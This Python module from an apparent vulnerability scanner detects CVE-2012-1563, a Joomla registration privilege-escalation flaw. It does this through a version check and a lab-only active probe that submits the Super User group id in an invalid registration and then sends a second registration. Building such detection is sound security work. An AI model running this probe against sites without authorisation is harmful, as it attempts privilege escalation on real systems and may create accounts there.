from __future__ import annotations

import re
import secrets
from typing import Any

from ...core.args import aggressive_value
from ...core.http import HttpClient, normalize_url
from ...core.models import Confidence, Finding, Status
from ...core.versions import parse_version_required, parse_version_safe
from .advisory import passive_core_finding

CVE_ID = "CVE-2012-1563"
NAME = "Joomla core privilege escalation via registration state"
AFFECTED_RULE = "Joomla 1.6.x, 1.7.x and 2.5.0 through 2.5.2"
REMEDIATION = "Upgrade to Joomla 2.5.3 or a newer supported release and disable registration if unused."
REGISTER_PATH = "/index.php?option=com_users&view=registration"
SUBMIT_PATH = "/index.php"
VULN_TYPE = "Privilege Escalation"
SUPER_MESSAGE = "Only users with Super Admin permissions can change other Super Admin user accounts"


def classify_version(version: str | None) -> str:
    parsed = parse_version_safe(version)
    if parsed is None:
        return Status.DETECTED_VERSION_UNKNOWN
    if parsed < parse_version_required("1.6.0"):
        return Status.NOT_AFFECTED
    if parsed < parse_version_required("2.0.0"):
        return Status.LIKELY_VULNERABLE
    if parsed < parse_version_required("2.5.0"):
        return Status.NOT_AFFECTED
    return Status.LIKELY_VULNERABLE if parsed < parse_version_required("2.5.3") else Status.PATCHED


def _token(client: HttpClient, timeout: int) -> str | None:
    response = client.get(REGISTER_PATH, timeout=timeout)
    body = str(response.get("body", ""))
    match = re.search(r'name="([0-9a-f]{32})"[^>]*value="1"', body)
    return match.group(1) if match else None


def _submit(client: HttpClient, token: str | None, fields: dict[str, str], timeout: int) -> dict[str, Any]:
    payload = {"option": "com_users", "task": "registration.register"}
    if token:
        payload[token] = "1"
    payload.update(fields)
    response = client.post(SUBMIT_PATH, fields=payload, timeout=timeout)
    body = str(response.get("body", ""))
    text = re.sub(r"\s+", " ", re.sub(r"<[^>]+>", " ", body))
    return {
        "status": response.get("status", 0),
        "super_message": SUPER_MESSAGE in text,
        "invalid_email_message": "email address you entered is already in use or invalid" in text,
        "thank_you": "Thank you for registering" in text,
        "registration_failed": "Registration failed" in text,
        "messages": [
            m.strip()[:160]
            for m in re.findall(
                r'<div class="alert[^"]*">\s*(.*?)\s*</div>', body, re.DOTALL
            )[:3]
        ],
    }


def run_aggressive_probe(
    target_url: str,
    timeout: int = 12,
    proxy: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    aggressive_command: str | None = None,
) -> Finding:
    """Lab-only registration-state differential.

    A first, invalid registration stores a submitted group value in the session;
    a second valid registration lets the model merge that session state into
    the new user. On an affected release the injected Super User group reaches
    the user model and is rejected with a distinctive message. On a fixed
    release the session group value is cleared and the rejection does not
    occur. A patched target may create a disposable account during the second
    submission; run this only in an isolated lab.
    """
    base = normalize_url(target_url)
    super_group = (
        aggressive_value(aggressive_args, aggressive_command, "super_group", "8") or "8"
    )
    password = (
        aggressive_value(aggressive_args, aggressive_command, "registration_password", "")
        or "ProofcmsLab!2026"
    )
    prefix = "p" + secrets.token_hex(3)

    evidence: dict[str, Any] = {
        "super_group": super_group,
        "registration_prefix": prefix,
        "acknowledgement": "isolated lab only; a patched target may create a disposable account",
    }
    client = HttpClient(base_url=base, timeout=timeout, proxy=proxy)
    token1 = _token(client, timeout)
    form = client.get(REGISTER_PATH, timeout=timeout)
    registration_form_present = "jform[username]" in str(form.get("body", ""))
    evidence.update(
        {
            "form_status": form.get("status", 0),
            "registration_form_present": registration_form_present,
            "token_present": bool(token1),
        }
    )
    if not registration_form_present or not token1:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.NOT_CONFIRMED,
            confidence=Confidence.MEDIUM,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=False,
            proof_url=f"{base}{REGISTER_PATH}",
            evidence=evidence,
            detail="Public registration is unavailable or the form did not expose a session token; the probe could not run.",
            action=REMEDIATION,
            vulnerability_type=VULN_TYPE,
        )

    step1 = _submit(
        client,
        token1,
        {
            "jform[name]": prefix + " One",
            "jform[username]": prefix + "one",
            "jform[password1]": password,
            "jform[password2]": password,
            "jform[email1]": "not-an-address",
            "jform[email2]": "not-an-address",
            "jform[groups][]": super_group,
        },
        timeout,
    )
    token2 = _token(client, timeout)
    step2 = _submit(
        client,
        token2,
        {
            "jform[name]": prefix + " Two",
            "jform[username]": prefix + "two",
            "jform[password1]": password,
            "jform[password2]": password,
            "jform[email1]": f"{prefix}two@example.test",
            "jform[email2]": f"{prefix}two@example.test",
        },
        timeout,
    )
    evidence.update(
        {
            "step1_status": step1["status"],
            "step1_invalid_email_message": step1["invalid_email_message"],
            "step2_status": step2["status"],
            "step2_super_message": step2["super_message"],
            "step2_registration_failed": step2["registration_failed"],
            "messages": step2["messages"],
        }
    )

    if step1["invalid_email_message"] and step2["super_message"]:
        return Finding(
            cve=CVE_ID,
            name=NAME,
            status=Status.VULNERABLE,
            confidence=Confidence.CONFIRMED,
            component="Joomla core",
            affected_rule=AFFECTED_RULE,
            exploit_available=True,
            exploit_ran=True,
            proof_url=f"{base}{REGISTER_PATH}",
            evidence=evidence,
            detail=(
                "A group value supplied in an invalid registration was carried through session "
                "state into a second, valid registration on the affected release; the user model "
                "rejected it because it contained a Super User group. No elevated account was "
                "created on the affected build."
            ),
            action=REMEDIATION,
            vulnerability_type=VULN_TYPE,
        )

    return Finding(
        cve=CVE_ID,
        name=NAME,
        status=Status.NOT_CONFIRMED,
        confidence=Confidence.MEDIUM,
        component="Joomla core",
        affected_rule=AFFECTED_RULE,
        exploit_available=True,
        exploit_ran=True,
        proof_url=f"{base}{REGISTER_PATH}",
        evidence=evidence,
        detail=(
            "The submitted group value did not reach the user model (no Super User rejection "
            "message), consistent with the fixed registration state handling."
        ),
        action=REMEDIATION,
        vulnerability_type=VULN_TYPE,
    )


def check(
    target_url: str,
    joomla_version: str | None = None,
    run_exploit_check: bool = False,
    timeout: int = 12,
    proxy: str | None = None,
    exploit_mode: str = "safe",
    aggressive_command: str | None = None,
    aggressive_args: dict[str, Any] | None = None,
    **kwargs: Any,
) -> Finding:
    result = passive_core_finding(
        cve=CVE_ID,
        name=NAME,
        affected_rule=AFFECTED_RULE,
        joomla_version=joomla_version,
        classify=classify_version,
        remediation=REMEDIATION,
    )
    result.vulnerability_type = VULN_TYPE
    if not run_exploit_check:
        return result
    if exploit_mode != "aggressive":
        result.detail += " This module supports only the isolated-lab aggressive registration-state probe."
        return result
    if result.status not in {Status.LIKELY_VULNERABLE, Status.INCONCLUSIVE}:
        result.detail += " Active check skipped because the detected Joomla release is not affected."
        return result
    probe = run_aggressive_probe(
        target_url,
        timeout=timeout,
        proxy=proxy,
        aggressive_args=aggressive_args,
        aggressive_command=aggressive_command,
    )
    probe.component_version = joomla_version
    return probe


def metadata() -> dict[str, Any]:
    return {
        "cve": CVE_ID,
        "cms": "joomla",
        "name": NAME,
        "component": "Joomla core",
        "affected_rule": AFFECTED_RULE,
        "affected_joomla_versions": ["1.6.0-1.7.5", "2.5.0-2.5.2"],
        "exploit_available": True,
        "exploit_modes": ["aggressive"],
        "intrusive": True,
        "vulnerability_type": VULN_TYPE,
        "module_version": "2.0.0",
        "last_reviewed": "2026-11-22",
        "updated": "2026-11-22",
        "required_detectors": [],
        "references": [
            "https://www.cve.org/CVERecord?id=CVE-2012-1563",
            "https://developer.joomla.org/security-centre/395-20120303-core-privilege-escalation.html",
        ],
    }
